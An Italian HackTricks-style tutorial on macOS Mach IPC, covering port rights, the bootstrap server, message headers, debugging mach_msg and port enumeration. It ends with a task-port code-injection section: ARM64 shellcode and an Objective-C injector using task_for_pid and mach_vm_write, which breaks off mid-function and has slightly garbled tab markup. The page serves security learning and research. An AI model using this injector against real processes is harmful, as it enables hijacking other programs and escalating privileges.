# macOS IPC - Comunicazione tra processi

<details>

<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR a** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos di github.

</details>

## Messaggistica Mach tramite Porte

### Informazioni di base

Mach utilizza **task** come **unità più piccola** per la condivisione di risorse, e ogni task può contenere **più thread**. Questi **task e thread sono mappati 1:1 ai processi e ai thread POSIX**.

La comunicazione tra i task avviene tramite la Comunicazione tra Processi Mach (IPC), utilizzando canali di comunicazione unidirezionali. **I messaggi vengono trasferiti tra le porte**, che agiscono come una sorta di **code di messaggi** gestite dal kernel.

Una **porta** è l'**elemento base** dell'IPC di Mach. Può essere utilizzata per **inviare messaggi e riceverli**.

Ogni processo ha una **tabella IPC**, dove è possibile trovare le **porte mach del processo**. Il nome di una porta mach è in realtà un numero (un puntatore all'oggetto del kernel).

Un processo può anche inviare un nome di porta con alcuni diritti **a un task diverso** e il kernel renderà visibile questa voce nella **tabella IPC dell'altro task**.

### Diritti delle Porte

I diritti delle porte, che definiscono le operazioni che un task può eseguire, sono fondamentali per questa comunicazione. I possibili **diritti delle porte** sono ([definizioni da qui](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

* **Diritto di ricezione**, che consente di ricevere messaggi inviati alla porta. Le porte Mach sono code MPSC (multiple-producer, single-consumer), il che significa che può esserci **solo un diritto di ricezione per ogni porta** in tutto il sistema (a differenza delle pipe, dove più processi possono tutti detenere descrittori di file per l'estremità di lettura di una pipe).
* Un **task con il diritto di ricezione** può ricevere messaggi e **creare diritti di invio**, consentendogli di inviare messaggi. Originariamente solo il **proprio task ha il diritto di ricezione sulla sua porta**.
* Se il proprietario del diritto di ricezione **muore** o lo termina, il **diritto di invio diventa inutile (nome morto).**
* **Diritto di invio**, che consente di inviare messaggi alla porta.
* Il diritto di invio può essere **clonato** in modo che un task che possiede un diritto di invio possa clonare il diritto e **concederlo a un terzo task**.
* Nota che i **diritti delle porte** possono anche essere **passati** attraverso i messaggi Mac.
* **Diritto di invio una volta sola**, che consente di inviare un messaggio alla porta e poi scompare.
* Questo diritto **non** può essere **clonato**, ma può essere **spostato**.
* **Diritto di insieme di porte**, che indica un _insieme di porte_ anziché una singola porta. Estrarre un messaggio da un insieme di porte estrae un messaggio da una delle porte che contiene. Gli insiemi di porte possono essere utilizzati per ascoltare su più porte contemporaneamente, molto simile a `select`/`poll`/`epoll`/`kqueue` in Unix.
* **Nome morto**, che non è un vero e proprio diritto di porta, ma solo un segnaposto. Quando una porta viene distrutta, tutti i diritti di porta esistenti per la porta diventano nomi morti.

**I task possono trasferire DIRITTI DI INVIO ad altri**, consentendo loro di inviare messaggi indietro. **I DIRITTI DI INVIO possono anche essere clonati, quindi un task può duplicare e dare il diritto a un terzo task**. Questo, combinato con un processo intermedio noto come il **bootstrap server**, consente una comunicazione efficace tra i task.

### Porte File

Le porte file consentono di incapsulare i descrittori di file in porte Mac (utilizzando i diritti delle porte Mach). È possibile creare un `fileport` da un determinato FD utilizzando `fileport_makeport` e creare un FD da un fileport utilizzando `fileport_makefd`.

### Stabilire una comunicazione

Come già accennato, è possibile inviare diritti utilizzando messaggi Mach, tuttavia, **non è possibile inviare un diritto senza già avere un diritto** per inviare un messaggio Mach. Quindi, come viene stabilita la prima comunicazione?

Per questo, è coinvolto il **bootstrap server** (**launchd** in mac), poiché **chiunque può ottenere un DIRITTO DI INVIO al bootstrap server**, è possibile chiedergli un diritto per inviare un messaggio a un altro processo:

1. Il Task **A** crea una **nuova porta**, ottenendo il **DIRITTO DI RICEZIONE** su di essa.
2. Il Task **A**, essendo il detentore del DIRITTO DI RICEZIONE, **genera un DIRITTO DI INVIO per la porta**.
3. Il Task **A** stabilisce una **connessione** con il **bootstrap server**, e **gli invia il DIRITTO DI INVIO** per la porta generato all'inizio.
* Ricorda che chiunque può ottenere un DIRITTO DI INVIO al bootstrap server.
4. Il Task A invia un messaggio `bootstrap_register` al bootstrap server per **associare la porta data a un nome** come `com.apple.taska`
5. Il Task **B** interagisce con il **bootstrap server** per eseguire una **ricerca bootstrap per il servizio** (`bootstrap_lookup`). Quindi, affinché il bootstrap server possa rispondere, il task B invierà un **DIRITTO DI INVIO a una porta che ha creato precedentemente** all'interno del messaggio di ricerca. Se la ricerca ha successo, il **server duplica il DIRITTO DI INVIO** ricevuto dal Task A e lo **trasmette al Task B**.
* Ricorda che chiunque può ottenere un DIRITTO DI INVIO al bootstrap server.
6. Con questo DIRITTO DI INVIO, il **Task B** è in grado di **inviare** un **messaggio** **al Task A**.
7. Per una comunicazione bidirezionale di solito il task **B** genera una nuova porta con un **DIRITTO DI RICEZIONE** e un **DIRITTO DI INVIO**, e dà il **DIRITTO DI INVIO al Task A** in modo che possa inviare messaggi a TASK B (comunicazione bidirezionale).

Il bootstrap server **non può autenticare** il nome del servizio reclamato da un task. Ciò significa che un **task** potrebbe potenzialmente **fingere di essere qualsiasi task di sistema**, come ad esempio **reclamare falsamente un nome di servizio di autorizzazione** e quindi approvare ogni richiesta.

Successivamente, Apple memorizza i **nomi dei servizi forniti dal sistema** in file di configurazione sicuri, situati in directory protette da SIP: `/System/Library/LaunchDaemons` e `/System/Library/LaunchAgents`. Accanto a ciascun nome di servizio, è anche memorizzato il **binario associato**. Il bootstrap server, creerà e manterrà un **DIRITTO DI RICEZIONE per ciascuno di questi nomi di servizio**.

Per questi servizi predefiniti, il **processo di ricerca differisce leggermente**. Quando viene cercato un nome di servizio, launchd avvia il servizio dinamicamente. Il nuovo flusso di lavoro è il seguente:

* Il Task **B** avvia una **ricerca bootstrap** per un nome di servizio.
* **launchd** controlla se il task è in esecuzione e se non lo è, lo **avvia**.
* Il Task **A** (il servizio) esegue un **check-in bootstrap** (`bootstrap_check_in()`). Qui, il **bootstrap** server crea un DIRITTO DI INVIO, lo mantiene e **trasferisce il DIRITTO DI RICEZIONE al Task A**.
* launchd duplica il **DIRITTO DI INVIO e lo invia al Task B**.
* Il Task **B** genera una nuova porta con un **DIRITTO DI RICEZIONE** e un **DIRITTO DI INVIO**, e dà il **DIRITTO DI INVIO al Task A** (il servizio) in modo che possa inviare messaggi a TASK B (comunicazione bidirezionale).

Tuttavia, questo processo si applica solo ai task di sistema predefiniti. I task non di sistema continuano a operare come descritto originariamente, il che potrebbe potenzialmente consentire l'usurpazione.

{% hint style="danger" %}
Pertanto, launchd non dovrebbe mai bloccarsi o l'intero sistema si bloccherà.
{% endhint %}
### Un messaggio Mach

[Ulteriori informazioni qui](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

La funzione `mach_msg`, essenzialmente una chiamata di sistema, viene utilizzata per inviare e ricevere messaggi Mach. La funzione richiede che il messaggio venga inviato come argomento iniziale. Questo messaggio deve iniziare con una struttura `mach_msg_header_t`, seguita dal contenuto effettivo del messaggio. La struttura è definita come segue:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
I processi che possiedono un _**diritto di ricezione**_ possono ricevere messaggi su una porta Mach. Al contrario, i **mittenti** ottengono un _**diritto di invio**_ o un _**diritto di invio una sola volta**_. Il diritto di invio una sola volta è esclusivamente per l'invio di un singolo messaggio, dopodiché diventa non valido.

Il campo iniziale **`msgh_bits`** è una mappa di bit:

- Il primo bit (più significativo) viene utilizzato per indicare che un messaggio è complesso (più dettagli in seguito)
- Il 3° e 4° bit sono utilizzati dal kernel
- I **5 bit meno significativi del 2° byte** possono essere utilizzati per il **voucher**: un altro tipo di porta per inviare combinazioni chiave/valore.
- I **5 bit meno significativi del 3° byte** possono essere utilizzati per la **porta locale**
- I **5 bit meno significativi del 4° byte** possono essere utilizzati per la **porta remota**

I tipi che possono essere specificati nel voucher, nelle porte locali e remote sono (da [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Per esempio, `MACH_MSG_TYPE_MAKE_SEND_ONCE` può essere utilizzato per **indicare** che un **diritto di invio una sola volta** deve essere derivato e trasferito per questa porta. Può anche essere specificato `MACH_PORT_NULL` per impedire al destinatario di poter rispondere.

Per ottenere una facile **comunicazione bidirezionale**, un processo può specificare una **porta mach** nell'**intestazione del messaggio mach** chiamata _porta di risposta_ (**`msgh_local_port`**) dove il **ricevente** del messaggio può **inviare una risposta** a questo messaggio.

{% hint style="success" %}
Nota che questo tipo di comunicazione bidirezionale è utilizzato nei messaggi XPC che si aspettano una risposta (`xpc_connection_send_message_with_reply` e `xpc_connection_send_message_with_reply_sync`). Ma **di solito vengono creati porti diversi** come spiegato in precedenza per creare la comunicazione bidirezionale.
{% endhint %}

Gli altri campi dell'intestazione del messaggio sono:

- `msgh_size`: la dimensione dell'intero pacchetto.
- `msgh_remote_port`: la porta su cui viene inviato questo messaggio.
- `msgh_voucher_port`: [voucher mach](https://robert.sesek.com/2023/6/mach\_vouchers.html).
- `msgh_id`: l'ID di questo messaggio, interpretato dal ricevente.

{% hint style="danger" %}
Nota che **i messaggi mach vengono inviati su una `porta mach`**, che è un canale di comunicazione **singolo destinatario**, **multiplo mittente** integrato nel kernel mach. **Più processi** possono **inviare messaggi** a una porta mach, ma in un dato momento solo **un singolo processo può leggere** da essa.
{% endhint %}

I messaggi sono quindi formati dall'intestazione **`mach_msg_header_t`** seguita dal **corpo** e dal **trailer** (se presente) e possono concedere il permesso di rispondere ad esso. In questi casi, il kernel deve solo passare il messaggio da un task all'altro.

Un **trailer** è **un'informazione aggiunta al messaggio dal kernel** (non può essere impostata dall'utente) che può essere richiesta nella ricezione del messaggio con i flag `MACH_RCV_TRAILER_<trailer_opt>` (ci sono diverse informazioni che possono essere richieste).

#### Messaggi Complessi

Tuttavia, ci sono altri messaggi più **complessi**, come quelli che passano diritti di porta aggiuntivi o condividono memoria, dove il kernel deve anche inviare questi oggetti al destinatario. In questi casi, il bit più significativo dell'intestazione `msgh_bits` è impostato.

I descrittori possibili da passare sono definiti in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32 bit, tutti i descrittori sono di 12B e il tipo di descrittore è nel 11°. In 64 bit, le dimensioni variano.

{% hint style="danger" %}
Il kernel copierà i descrittori da un task all'altro ma prima **creerà una copia nella memoria del kernel**. Questa tecnica, nota come "Feng Shui", è stata abusata in diversi exploit per fare in modo che il **kernel copi i dati nella sua memoria** facendo sì che un processo invii descrittori a se stesso. Quindi il processo può ricevere i messaggi (il kernel li libererà).

È anche possibile **inviare diritti di porta a un processo vulnerabile**, e i diritti di porta appariranno semplicemente nel processo (anche se non li sta gestendo).
{% endhint %}

### API delle porte Mac

Nota che le porte sono associate allo spazio dei nomi del task, quindi per creare o cercare una porta, viene anche interrogato lo spazio dei nomi del task (più in `mach/mach_port.h`):

* **`mach_port_allocate` | `mach_port_construct`**: **Crea** una porta.
* `mach_port_allocate` può anche creare un **insieme di porte**: diritto di ricezione su un gruppo di porte. Ogni volta che viene ricevuto un messaggio, viene indicata la porta da cui proviene.
* `mach_port_allocate_name`: Cambia il nome della porta (di default un intero a 32 bit)
* `mach_port_names`: Ottieni i nomi delle porte da un target
* `mach_port_type`: Ottieni i diritti di un task su un nome
* `mach_port_rename`: Rinomina una porta (come dup2 per FD)
* `mach_port_allocate`: Alloca un nuovo RICEVI, PORT\_SET o DEAD\_NAME
* `mach_port_insert_right`: Crea un nuovo diritto in una porta dove hai RICEVI
* `mach_port_...`
* **`mach_msg`** | **`mach_msg_overwrite`**: Funzioni utilizzate per **inviare e ricevere messaggi mach**. La versione overwrite consente di specificare un buffer diverso per la ricezione del messaggio (l'altra versione lo riutilizzerà).

### Debug di mach\_msg

Poiché le funzioni **`mach_msg`** e **`mach_msg_overwrite`** sono quelle utilizzate per inviare e ricevere messaggi, impostare un breakpoint su di esse consentirebbe di ispezionare i messaggi inviati e ricevuti.

Ad esempio, inizia a eseguire il debug di qualsiasi applicazione che puoi eseguire il debug poiché caricherà **`libSystem.B` che utilizzerà questa funzione**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Per ottenere gli argomenti di **`mach_msg`** controlla i registri. Questi sono gli argomenti (da [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Ottenere i valori dai registri:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Ispeziona l'intestazione del messaggio controllando il primo argomento:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Quel tipo di `mach_msg_bits_t` è molto comune per consentire una risposta.



### Enumerare le porte
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Il **nome** è il nome predefinito assegnato alla porta (controlla come sta **aumentando** nei primi 3 byte). L'**`ipc-object`** è l'**identificatore** univoco **offuscato** della porta.\
Nota anche come le porte con solo il diritto di **`send`** stanno **identificando il proprietario** di essa (nome della porta + pid).\
Nota anche l'uso di **`+`** per indicare **altri task connessi alla stessa porta**.

È anche possibile utilizzare [**procesxp**](https://www.newosxbook.com/tools/procexp.html) per vedere anche i **nomi dei servizi registrati** (con SIP disabilitato a causa della necessità di `com.apple.system-task-port`):
```
procesp 1 ports
```
Puoi installare questo strumento su iOS scaricandolo da [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Esempio di codice

Nota come il **mittente** **alloca** una porta, crea un **diritto di invio** per il nome `org.darlinghq.example` e lo invia al **server di avvio** mentre il mittente ha richiesto il **diritto di invio** di quel nome e lo ha usato per **inviare un messaggio**.

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### Porte privilegiate

* **Porta host**: Se un processo ha il privilegio di **Invio** su questa porta può ottenere **informazioni** sul **sistema** (ad esempio `host_processor_info`).
* **Porta host priv**: Un processo con il diritto di **Invio** su questa porta può eseguire **azioni privilegiate** come caricare un'estensione del kernel. Il **processo deve essere root** per ottenere questo permesso.
* Inoltre, per chiamare l'API **`kext_request`** è necessario avere altri diritti **`com.apple.private.kext*`** che vengono concessi solo ai binari Apple.
* **Porta nome attività**: Una versione non privilegiata della _porta attività_. Fa riferimento all'attività, ma non consente di controllarla. L'unica cosa che sembra essere disponibile tramite di essa è `task_info()`.
* **Porta attività** (alias porta kernel)**:** Con il permesso di Invio su questa porta è possibile controllare l'attività (leggere/scrivere memoria, creare thread...).
* Chiamare `mach_task_self()` per **ottenere il nome** di questa porta per l'attività chiamante. Questa porta viene ereditata solo attraverso **`exec()`**; una nuova attività creata con `fork()` ottiene una nuova porta attività (come caso speciale, un'attività ottiene anche una nuova porta attività dopo `exec()` in un binario suid). L'unico modo per generare un'attività e ottenere la sua porta è eseguire la ["danza dello scambio di porte"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html) mentre si esegue un `fork()`.
* Queste sono le restrizioni per accedere alla porta (da `macos_task_policy` dal binario `AppleMobileFileIntegrity`):
* Se l'app ha il diritto **`com.apple.security.get-task-allow`** i processi dello **stesso utente possono accedere alla porta attività** (comunemente aggiunto da Xcode per il debug). Il processo di **notarizzazione** non lo permetterà per i rilasci in produzione.
* Le app con il diritto **`com.apple.system-task-ports`** possono ottenere la **porta attività per qualsiasi** processo, tranne il kernel. Nelle versioni precedenti era chiamato **`task_for_pid-allow`**. Questo è concesso solo alle applicazioni Apple.
* **Root può accedere alle porte attività** delle applicazioni **non** compilati con un **ambiente di esecuzione rafforzato** (e non di Apple).

### Iniezione di shellcode nel thread tramite porta attività

È possibile ottenere un shellcode da:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %} 
### Intestazioni

Il file `entitlements.plist` contiene le autorizzazioni richieste dall'applicazione per accedere a funzionalità specifiche del sistema operativo. Queste autorizzazioni possono essere sfruttate per ottenere privilegi elevati o per condurre attacchi di escalation dei privilegi. Assicurati di verificare e limitare attentamente le autorizzazioni elencate in questo file per garantire la sicurezza del sistema.
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

**Compila** il programma precedente e aggiungi i **privilegi** per poter iniettare codice con lo stesso utente (altrimenti dovrai usare **sudo**).

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
